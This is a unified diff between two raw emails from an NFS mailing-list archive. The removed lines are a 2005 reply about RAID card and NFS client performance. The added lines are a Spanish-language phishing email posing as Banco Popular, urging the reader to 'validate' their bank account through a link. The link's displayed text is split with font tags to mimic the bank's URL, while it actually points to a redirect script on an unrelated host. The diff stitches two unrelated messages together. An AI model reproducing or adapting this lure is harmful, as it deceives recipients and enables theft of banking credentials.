@@ -1,26 +1,24 @@
-From: Brian Kerr <kerrboy@gmail.com>
-Subject: Re: OT: RAID perf doldrums: advice/recommendations?
-Date: Thu, 10 Nov 2005 11:18:51 -0500
-Message-ID: <b83c9e30511100818s2e176e3bu730e65dfa1cb7d14@mail.gmail.com>
-References: <20051028032149.14201.qmail@web51905.mail.yahoo.com>
-	 <1130786827.31211.49.camel@seki.nac.uci.edu>
+From: <info@bancopopular.es>
+Subject: ¡ALERTA CORREOS FALSOS 88913!
+Date: Fri, 11 Nov 2005 03:30:48 +0900
+Message-ID: <200511101830.jAAIUmBn000496@g11.asadal.net>
+Reply-To: juancarlos.vizcaino@educ.mec.es
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-8859-1
-Cc: email builder <emailbuilder88@yahoo.com>,
-	nfs@lists.sourceforge.net
+Content-Type: text/html
 Return-path: <nfs-admin@lists.sourceforge.net>
-Received: from sc8-sf-mx1-b.sourceforge.net ([10.3.1.91] helo=mail.sourceforge.net)
+Received: from sc8-sf-mx2-b.sourceforge.net ([10.3.1.92] helo=mail.sourceforge.net)
 	by sc8-sf-list2.sourceforge.net with esmtp (Exim 4.30)
-	id 1EaFEh-0003Hs-LI
-	for nfs@lists.sourceforge.net; Thu, 10 Nov 2005 08:25:15 -0800
-Received: from xproxy.gmail.com ([66.249.82.198])
-	by mail.sourceforge.net with esmtp (Exim 4.44)
-	id 1EaFEg-0001RN-8F
-	for nfs@lists.sourceforge.net; Thu, 10 Nov 2005 08:25:15 -0800
-Received: by xproxy.gmail.com with SMTP id s6so736613wxc
-        for <nfs@lists.sourceforge.net>; Thu, 10 Nov 2005 08:25:10 -0800 (PST)
-To: Dan Stromberg <strombrg@dcs.nac.uci.edu>
-In-Reply-To: <1130786827.31211.49.camel@seki.nac.uci.edu>
+	id 1EaHCL-00017q-JH
+	for nfs@lists.sourceforge.net; Thu, 10 Nov 2005 10:30:57 -0800
+Received: from [211.115.110.71] (helo=g11.asadal.net)
+	by mail.sourceforge.net with esmtps (TLSv1:AES256-SHA:256)
+	(Exim 4.44)
+	id 1EaHCI-0006hX-84
+	for nfs@lists.sourceforge.net; Thu, 10 Nov 2005 10:30:56 -0800
+Received: from g11.asadal.net (localhost.localdomain [127.0.0.1])
+	by g11.asadal.net (8.12.8/8.12.8) with ESMTP id jAAIUnuM000645
+	for <nfs@lists.sourceforge.net>; Fri, 11 Nov 2005 03:30:49 +0900
+To: nfs@lists.sourceforge.net
 Sender: nfs-admin@lists.sourceforge.net
 Errors-To: nfs-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
@@ -34,34 +32,32 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
 	<mailto:nfs-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=nfs>
 
-On 10/31/05, Dan Stromberg <strombrg@dcs.nac.uci.edu> wrote:
->
-> Most, if not all, of my notes pertaining to large storage are here:
->
-> http://dcs.nac.uci.edu/~strombrg/tech-tidbits-by-category.html#Large%20St=
-orage
->
-> I think commodity hardware is generally a good way to go when you can,
-> but we also had bad experiences with some 3Ware RAID cards, though in
-> our case, it wasn't clear if the problem was best attributed to the
-> Maxtor disks, the 3Ware RAID cards, the Promicrosystems PC's, or the GFS
-> and Lustre we tried overtop of this hardware.
+=A1Querido y apreciado nfs@lists.sourceforge.net=0D usuario de Grupo Banc=
+o Popular!<br><br>
+Las entidades financieras del mundo entero y sus clientes siempre sufrian=
+ por=20
+las tentativas de los criminales de recibir dinero por dolo. Hay varios m=
+odos
+ de efectuar dichas tentativas. (por ejemplo, falsificacion de tarjetas d=
+e=20
+ credito, uso no autorizado de telefono o Internet)<br>
+En el marco de nuestro compromiso de prestar optimos=20
+servicios ("Best Possible") a todos nuestros clientes, le rogamos
+ validar sus cuentas una vez al mes.<br>
+Para validar su cuenta bancaria personal online BANCO POPULAR,
+ siga el siguiente link: <a href=3D"http://unistyle.ktown.ne.kr/zboard/re=
+dirs.php"><font>ht<font>tp</font><font>s://</font><font>www2.</font><font=
+>bancopop</font><font>ular.es/Ap</font><font>pBPE/servle<font><font>t/ser=
+vin?p_</font><font>pm=3Dbo&p_pf</font>=3Dc&p_id=3Desp</font></a>  <br>
+Estas medidas de seguridad son necesarias para proteger la integridad de =
+su cuenta.<br>
+Presentamos nuestras excusas por las molestias que puedan causar dichas m=
+edidas. Estamos convencidos de que al fin y al cabo esta medida suplement=
+aria de seguridad asegurara veinticuatro horas al dia la proteccion de su=
+s cuentas
 
-I agree that commodity hardware is a good way to go if possible.  I've
-had great experience with 3ware cards on Redhat systems if they are
-running the latest firmware/driver - horrible experiences otherwise.=20
-Also had horrible luck with maxtor drives on 3ware controllers and
-maxtor drives in generally - you should think twice about using them.
 
-We see 12MB/sec from multiple clients all day long on RH systems with
-this configuration - this is just ata raid on 75xx controllers,
-nothing fancy.
 
-Obviously the following options are huge for performance on clients as
-well, tcp,rsize=3D8192,wsize=3D8192
-
-The sync option also has a rather large impact on client write
-performance and I have left it async for that reason.
 
 
 -------------------------------------------------------
